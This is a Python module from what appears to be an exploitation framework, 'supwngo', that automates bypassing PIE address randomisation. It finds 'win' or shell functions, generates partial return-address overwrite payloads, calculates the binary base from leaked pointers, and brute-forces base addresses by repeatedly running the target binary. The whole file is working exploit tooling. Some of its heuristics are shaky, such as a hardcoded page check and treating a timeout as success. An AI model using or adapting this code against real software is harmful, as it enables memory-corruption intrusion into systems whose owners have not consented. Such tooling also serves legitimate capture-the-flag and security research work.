"""
PIE Bypass Automation Module.

Provides automated PIE bypass strategies including:
- Partial overwrite automation
- Base leak detection
- Brute force integration
- Relative addressing
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple, Callable
from pathlib import Path
from enum import Enum, auto
import struct
import subprocess
import re

from supwngo.core.binary import Binary
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class PIEBypassType(Enum):
    """Types of PIE bypass techniques."""
    PARTIAL_OVERWRITE = auto()  # Overwrite only low bytes
    BASE_LEAK = auto()          # Leak PIE base then calculate
    BRUTE_FORCE = auto()        # Brute force 4 bits
    RELATIVE_JUMP = auto()      # Use relative addresses
    FORMAT_STRING_LEAK = auto()  # Leak via format string
    VSYSCALL = auto()           # Use fixed vsyscall page


@dataclass
class PIEBypassStrategy:
    """A PIE bypass strategy."""
    bypass_type: PIEBypassType
    description: str
    success_probability: float  # 0.0 to 1.0
    requires_leak: bool = False
    requires_bruteforce: bool = False
    payload_generator: Optional[Callable] = None
    notes: List[str] = field(default_factory=list)


@dataclass
class PartialOverwriteInfo:
    """Information for partial overwrite attack."""
    target_symbol: str
    target_offset: int      # Offset within binary
    overwrite_bytes: int    # How many bytes to overwrite (1-3)
    current_low_bytes: int  # Current low bytes of return address
    target_low_bytes: int   # Target low bytes
    same_page: bool         # Whether target is on same page


@dataclass
class PIELeakInfo:
    """Information about a PIE base leak."""
    leak_source: str        # Where the leak comes from
    leaked_address: int     # The leaked address
    known_offset: int       # Known offset of leaked symbol
    calculated_base: int    # Calculated PIE base
    confidence: float       # Confidence in calculation


class PIEBypassAutomation:
    """
    Automated PIE bypass techniques.

    Provides:
    - Analysis of bypass opportunities
    - Partial overwrite payload generation
    - Brute force automation
    - Base address calculation from leaks
    """

    # Entropy bits for different systems
    # Linux x86_64: 28 bits for binary base (9 bits + 19 bits = 28 bits)
    # But practical: 12 bits are fixed (page offset), leaving ~16 bits random
    PIE_ENTROPY_BITS = {
        'linux_x64': 16,  # After page alignment
        'linux_x86': 8,
    }

    def __init__(self, binary: Binary):
        """
        Initialize PIE bypass automation.

        Args:
            binary: Binary instance
        """
        self.binary = binary
        self.strategies: List[PIEBypassStrategy] = []

    def analyze(self) -> List[PIEBypassStrategy]:
        """
        Analyze bypass opportunities for PIE binary.

        Returns:
            List of viable bypass strategies
        """
        if not self.binary.protections.pie:
            self.strategies.append(PIEBypassStrategy(
                bypass_type=PIEBypassType.BASE_LEAK,
                description="PIE not enabled - no bypass needed",
                success_probability=1.0,
            ))
            return self.strategies

        # Check for partial overwrite opportunities
        partial = self._analyze_partial_overwrite()
        if partial:
            self.strategies.extend(partial)

        # Check for leak opportunities
        leaks = self._analyze_leak_opportunities()
        if leaks:
            self.strategies.extend(leaks)

        # Always include brute force as fallback
        self.strategies.append(self._analyze_bruteforce())

        # Check for vsyscall (deprecated but sometimes useful)
        vsyscall = self._analyze_vsyscall()
        if vsyscall:
            self.strategies.append(vsyscall)

        # Sort by success probability
        self.strategies.sort(key=lambda s: -s.success_probability)

        return self.strategies

    def _analyze_partial_overwrite(self) -> List[PIEBypassStrategy]:
        """Analyze partial overwrite opportunities."""
        strategies = []

        # Find interesting targets in the same page as common return addresses
        # In PIE, main() and other code usually starts around offset 0x1000-0x2000

        win_funcs = self._find_win_functions()
        if not win_funcs:
            return strategies

        for name, offset in win_funcs:
            # Check if reachable with 1-byte overwrite (same page)
            if (offset & 0xFF00) == 0x1100:  # Common code page
                strategies.append(PIEBypassStrategy(
                    bypass_type=PIEBypassType.PARTIAL_OVERWRITE,
                    description=f"1-byte overwrite to reach {name}",
                    success_probability=1.0,  # 100% if on same page
                    notes=[
                        f"Target: {name} at offset 0x{offset:x}",
                        f"Overwrite last byte with 0x{offset & 0xFF:02x}",
                    ],
                ))

            # Check 2-byte overwrite (same 64K region)
            elif (offset & 0xFFFF0000) == (0x1000 & 0xFFFF0000):
                strategies.append(PIEBypassStrategy(
                    bypass_type=PIEBypassType.PARTIAL_OVERWRITE,
                    description=f"2-byte overwrite to reach {name}",
                    success_probability=1.0,
                    notes=[
                        f"Target: {name} at offset 0x{offset:x}",
                        f"Overwrite last 2 bytes with 0x{offset & 0xFFFF:04x}",
                    ],
                ))

        return strategies

    def _analyze_leak_opportunities(self) -> List[PIEBypassStrategy]:
        """Analyze opportunities to leak PIE base."""
        strategies = []

        # Check for format string vulnerability
        if self._has_format_string():
            strategies.append(PIEBypassStrategy(
                bypass_type=PIEBypassType.FORMAT_STRING_LEAK,
                description="Leak PIE base via format string",
                success_probability=0.95,
                requires_leak=True,
                notes=[
                    "Use %p or %lx to leak stack values",
                    "Return addresses on stack reveal PIE base",
                ],
            ))

        # Check for write-what-where with GOT
        if self.binary.protections.relro != "Full":
            strategies.append(PIEBypassStrategy(
                bypass_type=PIEBypassType.BASE_LEAK,
                description="Leak PIE base via GOT read",
                success_probability=0.9,
                requires_leak=True,
                notes=[
                    "Read GOT entry to get libc address",
                    "If binary leaks any pointer, can calculate base",
                ],
            ))

        return strategies

    def _analyze_bruteforce(self) -> PIEBypassStrategy:
        """Analyze brute force feasibility."""
        bits = self.binary.bits
        entropy = self.PIE_ENTROPY_BITS.get(
            f'linux_x{bits}',
            16
        )

        # With 4-bit nibble brute force
        attempts_needed = 16  # 2^4 for last nibble
        time_estimate = "~16 attempts"

        return PIEBypassStrategy(
            bypass_type=PIEBypassType.BRUTE_FORCE,
            description=f"Brute force 4 bits of ASLR ({time_estimate})",
            success_probability=1/16,  # Per attempt
            requires_bruteforce=True,
            notes=[
                f"PIE entropy: ~{entropy} bits",
                "Brute force last 4 bits (1/16 chance)",
                "May need multiple connection attempts",
            ],
        )

    def _analyze_vsyscall(self) -> Optional[PIEBypassStrategy]:
        """Check if vsyscall page is usable."""
        # vsyscall is at fixed address 0xffffffffff600000
        # Contains: gettimeofday, time, getcpu
        # Deprecated but sometimes enabled

        # Can only check if we're on Linux
        try:
            with open('/proc/sys/vm/vsyscall32', 'r') as f:
                # vsyscall might be emulated
                pass
        except:
            pass

        return PIEBypassStrategy(
            bypass_type=PIEBypassType.VSYSCALL,
            description="Use vsyscall page (fixed address)",
            success_probability=0.3,  # Often disabled
            notes=[
                "vsyscall at 0xffffffffff600000",
                "Contains ret-like gadgets",
                "Often disabled on modern systems",
            ],
        )

    def _find_win_functions(self) -> List[Tuple[str, int]]:
        """Find win functions and their offsets."""
        win_names = [
            'win', 'flag', 'shell', 'get_flag', 'print_flag',
            'give_shell', 'backdoor', 'secret',
        ]

        results = []
        for name, sym in self.binary.symbols.items():
            name_lower = name.lower()
            for win in win_names:
                if win in name_lower:
                    addr = sym.address if hasattr(sym, 'address') else sym
                    if addr:
                        # Calculate offset from base
                        offset = addr - self.binary.elf.address
                        results.append((name, offset))
                    break

        return results

    def _has_format_string(self) -> bool:
        """Check if binary has potential format string vulnerability."""
        # Look for printf family without format string
        dangerous = ['printf', 'sprintf', 'fprintf', 'snprintf']
        return any(func in self.binary.plt for func in dangerous)

    def generate_partial_overwrite(
        self,
        offset_to_ret: int,
        target_offset: int,
        overwrite_bytes: int = 1,
    ) -> bytes:
        """
        Generate partial overwrite payload.

        Args:
            offset_to_ret: Offset to return address in buffer
            target_offset: Target offset within PIE binary
            overwrite_bytes: Number of bytes to overwrite (1-3)

        Returns:
            Payload bytes
        """
        # Padding up to return address
        payload = b'A' * offset_to_ret

        # Extract low bytes of target
        if overwrite_bytes == 1:
            target_bytes = bytes([target_offset & 0xFF])
        elif overwrite_bytes == 2:
            target_bytes = struct.pack('<H', target_offset & 0xFFFF)
        elif overwrite_bytes == 3:
            target_bytes = struct.pack('<I', target_offset & 0xFFFFFF)[:3]
        else:
            raise ValueError("overwrite_bytes must be 1, 2, or 3")

        payload += target_bytes

        return payload

    def calculate_base_from_leak(
        self,
        leaked_addr: int,
        known_symbol: str,
    ) -> Optional[int]:
        """
        Calculate PIE base from a leaked address.

        Args:
            leaked_addr: Leaked address value
            known_symbol: Symbol name the address corresponds to

        Returns:
            Calculated PIE base or None
        """
        if known_symbol not in self.binary.symbols:
            return None

        sym = self.binary.symbols[known_symbol]
        sym_addr = sym.address if hasattr(sym, 'address') else sym
        if not sym_addr:
            return None

        # Offset is relative to default base
        default_base = self.binary.elf.address
        offset = sym_addr - default_base

        # Calculate actual base
        base = leaked_addr - offset

        # Verify alignment (page-aligned)
        if base & 0xFFF != 0:
            logger.warning(f"Calculated base not page-aligned: {hex(base)}")

        return base

    def get_absolute_address(
        self,
        pie_base: int,
        symbol: str,
    ) -> Optional[int]:
        """
        Get absolute address of symbol given PIE base.

        Args:
            pie_base: Calculated PIE base address
            symbol: Symbol to look up

        Returns:
            Absolute address or None
        """
        if symbol not in self.binary.symbols:
            return None

        sym = self.binary.symbols[symbol]
        sym_addr = sym.address if hasattr(sym, 'address') else sym
        if not sym_addr:
            return None

        default_base = self.binary.elf.address
        offset = sym_addr - default_base

        return pie_base + offset


class BruteForceHelper:
    """
    Helper for brute forcing PIE addresses.

    Provides utilities for:
    - Generating candidate addresses
    - Parallel brute forcing
    - Success detection
    """

    def __init__(self, binary_path: str, bits: int = 64):
        """
        Initialize brute force helper.

        Args:
            binary_path: Path to target binary
            bits: Architecture bits
        """
        self.binary_path = Path(binary_path)
        self.bits = bits

    def generate_candidates(
        self,
        known_offset: int,
        base_guess: int = None,
        nibble_bits: int = 4,
    ) -> List[int]:
        """
        Generate candidate addresses for brute forcing.

        Args:
            known_offset: Known offset of target in binary
            base_guess: Optional base address guess
            nibble_bits: Bits to brute force

        Returns:
            List of candidate addresses
        """
        candidates = []

        if base_guess is None:
            # Common PIE base addresses
            if self.bits == 64:
                base_guesses = [
                    0x555555554000,  # Common on modern Linux
                    0x55555555c000,
                    0x555555555000,
                ]
            else:
                base_guesses = [
                    0x56555000,
                    0x56556000,
                ]
        else:
            base_guesses = [base_guess]

        # Generate candidates for each base
        for base in base_guesses:
            # Vary the nibble
            mask = (1 << nibble_bits) - 1
            step = 0x1000  # Page size

            for i in range(1 << nibble_bits):
                varied_base = (base & ~(mask << 12)) | (i << 12)
                candidate = varied_base + known_offset
                candidates.append(candidate)

        return candidates

    def test_address(
        self,
        address: int,
        payload_generator: Callable[[int], bytes],
        success_check: Callable[[bytes], bool],
        timeout: float = 2.0,
    ) -> bool:
        """
        Test if an address is correct.

        Args:
            address: Address to test
            payload_generator: Function to generate payload with address
            success_check: Function to check if attempt succeeded
            timeout: Timeout for each attempt

        Returns:
            True if address is correct
        """
        try:
            payload = payload_generator(address)

            proc = subprocess.run(
                [str(self.binary_path)],
                input=payload,
                capture_output=True,
                timeout=timeout,
            )

            return success_check(proc.stdout)

        except subprocess.TimeoutExpired:
            # Timeout might indicate shell spawned
            return True
        except Exception:
            return False

    def bruteforce(
        self,
        known_offset: int,
        payload_generator: Callable[[int], bytes],
        success_check: Callable[[bytes], bool],
        max_attempts: int = 256,
    ) -> Optional[int]:
        """
        Brute force the PIE base.

        Args:
            known_offset: Known offset of target
            payload_generator: Function to generate payload
            success_check: Function to check success
            max_attempts: Maximum attempts

        Returns:
            Correct address or None
        """
        candidates = self.generate_candidates(known_offset)

        for i, candidate in enumerate(candidates[:max_attempts]):
            logger.debug(f"Attempt {i+1}/{len(candidates)}: 0x{candidate:x}")

            if self.test_address(candidate, payload_generator, success_check):
                logger.info(f"Found correct address: 0x{candidate:x}")
                return candidate

        return None


class PartialOverwriteBuilder:
    """
    Builds partial overwrite exploits.

    Handles:
    - Same-page partial overwrites (1 byte)
    - Cross-page partial overwrites (2-3 bytes)
    - Null byte handling
    """

    def __init__(self, binary: Binary, ret_offset: int):
        """
        Initialize partial overwrite builder.

        Args:
            binary: Binary instance
            ret_offset: Offset to return address in vulnerable buffer
        """
        self.binary = binary
        self.ret_offset = ret_offset
        self.word_size = binary.bits // 8

    def find_same_page_targets(self, current_ret_offset: int) -> List[Tuple[str, int, int]]:
        """
        Find targets reachable with same-page partial overwrite.

        Args:
            current_ret_offset: Current return address offset in binary

        Returns:
            List of (name, offset, bytes_needed) tuples
        """
        targets = []
        current_page = current_ret_offset & 0xFF00

        for name, sym in self.binary.symbols.items():
            addr = sym.address if hasattr(sym, 'address') else sym
            if not addr:
                continue

            offset = addr - self.binary.elf.address
            target_page = offset & 0xFF00

            if target_page == current_page:
                # Same page - 1 byte overwrite
                targets.append((name, offset, 1))
            elif (offset & 0xFFFF0000) == (current_ret_offset & 0xFFFF0000):
                # Same 64K region - 2 byte overwrite
                targets.append((name, offset, 2))

        return targets

    def build_payload(
        self,
        target_offset: int,
        bytes_to_overwrite: int,
        padding: bytes = b'A',
    ) -> bytes:
        """
        Build partial overwrite payload.

        Args:
            target_offset: Target offset in binary
            bytes_to_overwrite: How many bytes to overwrite
            padding: Padding character

        Returns:
            Payload bytes
        """
        payload = padding * self.ret_offset

        if bytes_to_overwrite == 1:
            payload += bytes([target_offset & 0xFF])
        elif bytes_to_overwrite == 2:
            payload += struct.pack('<H', target_offset & 0xFFFF)
        elif bytes_to_overwrite == 3:
            payload += struct.pack('<I', target_offset & 0xFFFFFF)[:3]

        return payload

    def check_null_bytes(self, target_offset: int, bytes_to_overwrite: int) -> bool:
        """
        Check if partial overwrite contains null bytes.

        Args:
            target_offset: Target offset
            bytes_to_overwrite: Number of bytes

        Returns:
            True if contains null bytes
        """
        if bytes_to_overwrite >= 1 and (target_offset & 0xFF) == 0:
            return True
        if bytes_to_overwrite >= 2 and ((target_offset >> 8) & 0xFF) == 0:
            return True
        if bytes_to_overwrite >= 3 and ((target_offset >> 16) & 0xFF) == 0:
            return True
        return False


def analyze_pie_bypass(binary: Binary) -> List[PIEBypassStrategy]:
    """
    Convenience function to analyze PIE bypass options.

    Args:
        binary: Binary instance

    Returns:
        List of viable strategies
    """
    analyzer = PIEBypassAutomation(binary)
    return analyzer.analyze()
